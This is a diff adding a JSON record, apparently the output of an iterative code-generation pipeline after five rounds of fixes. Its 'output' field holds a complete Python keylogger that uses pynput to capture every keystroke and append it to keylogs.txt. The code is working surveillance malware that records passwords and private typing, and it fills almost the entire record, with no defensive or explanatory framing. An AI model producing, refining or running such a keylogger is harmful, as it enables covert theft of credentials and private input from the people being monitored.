@@ -1,0 +1,9 @@
+{
+  "output": "import pynput\n\ndef on_press(key):\n    # Check if the key is an alphanumeric character or special key and write to file\n    try:\n        print(f'Alphanumeric key pressed: {key.char}')\n        with open('keylogs.txt', 'a') as keylog_file:\n            keylog_file.write(key.char)\n    except AttributeError:\n        print(f'Special key pressed: {str(key)}')\n        with open('keylogs.txt', 'a') as keylog_file:\n            keylog_file.write(str(key))\n\n# Set up the listener for keyboard events and start listening\nwith pynput.keyboard.Listener(on_press=on_press) as listener:\n    listener.join()",
+  "notes": "",
+  "applied_fixes": [
+    "iteration4_issue1",
+    "iteration4_issue2"
+  ],
+  "iterations": 5
+}
